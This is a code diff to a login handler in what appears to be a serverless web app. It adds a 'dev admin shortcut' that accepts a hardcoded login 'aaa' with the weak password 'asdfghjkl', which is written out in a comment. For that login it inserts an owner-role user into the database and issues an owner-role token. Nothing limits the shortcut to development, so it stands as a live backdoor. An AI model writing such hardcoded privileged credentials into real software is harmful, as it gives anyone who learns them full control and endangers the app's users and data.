@@ -236,6 +236,23 @@ const handleLogin: Handler = async (request, env) => {
     // Table may not exist yet — fall through to env-based auth
   }
 
+  // Dev admin shortcut: login "aaa" / password "asdfghjkl" → owner role
+  if (email === 'aaa' && computedHash === '5c80565db6f29da0b01aa12522c37b32f121cbe47a861ef7f006cb22922dffa1') {
+    // Ensure user exists in DB for consistency
+    try {
+      await env.DB.prepare(
+        "INSERT OR IGNORE INTO users (id, email, name, password_hash, role) VALUES ('dev-admin-aaa', 'aaa', 'Dev Admin', '5c80565db6f29da0b01aa12522c37b32f121cbe47a861ef7f006cb22922dffa1', 'owner')"
+      ).run();
+    } catch { /* table may not exist yet */ }
+    const token = await createToken(env.JWT_SECRET, {
+      sub: 'dev-admin-aaa',
+      email: 'aaa',
+      role: 'owner',
+      name: 'Dev Admin',
+    });
+    return json({ token, user: { id: 'dev-admin-aaa', email: 'aaa', name: 'Dev Admin', role: 'owner' } });
+  }
+
   // Fallback: check against env var hash (single admin)
   const storedHash = env.ADMIN_PASSWORD_HASH?.trim();
   if (storedHash && computedHash === storedHash) {
